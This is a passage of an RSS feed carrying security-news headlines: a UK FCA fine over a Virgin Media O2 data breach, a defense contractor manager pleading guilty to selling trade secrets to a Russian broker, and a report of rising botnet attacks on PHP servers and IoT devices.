breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>UK: FCA fines former employee of Virgin Media O2 for data protection breach</title><link>https://databreaches.net/2025/10/29/uk-fca-fines-former-employee-of-virgin-media-o2-for-data-protection-breach/?pk_campaign=feed&amp;pk_kwd=uk-fca-fines-former-employee-of-virgin-media-o2-for-data-protection-breach</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 29 Oct 2025 21:35:35 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Former General Manager for U.S. Defense Contractor Pleads Guilty to Selling Stolen Trade Secrets to Russian Broker</title><link>https://databreaches.net/2025/10/29/former-general-manager-for-u-s-defense-contractor-pleads-guilty-to-selling-stolen-trade-secrets-to-russian-broker/?pk_campaign=feed&amp;pk_kwd=former-general-manager-for-u-s-defense-contractor-pleads-guilty-to-selling-stolen-trade-secrets-to-russian-broker</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 29 Oct 2025 21:34:10 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Experts Reports Sharp Increase in Automated Botnet Attacks Targeting PHP Servers and IoT Devices</title><link>https://thehackernews.com/2025/10/experts-reports-sharp-increase-in.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivAUs8CWZuMjytXCzRiRr1Njj-R-Sv2PglgPmqZCLMHd71SMJyPl8hh9RPTqhzeZm7OJ7BdDEOO0b5bODPEvOl6uOB4cA1Hobq1j_O6uIsuFSqDMp-lyswH6W3-NIkX3fmGCsvU93B9OlouN-ngLew2lqxLFpQHA5NgedY2CQcyZQ-W4-GEtj-CK01hEb9/s1600/php-site.jpg" length="" type=""/><pubDate>Wed, 29 Oct 2025 15:38:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers are calling attention to a spike in automated attacks targeting PHP servers, IoT devices, and cloud gateways by various botnets such as Mirai, Gafgyt, and Mozi.
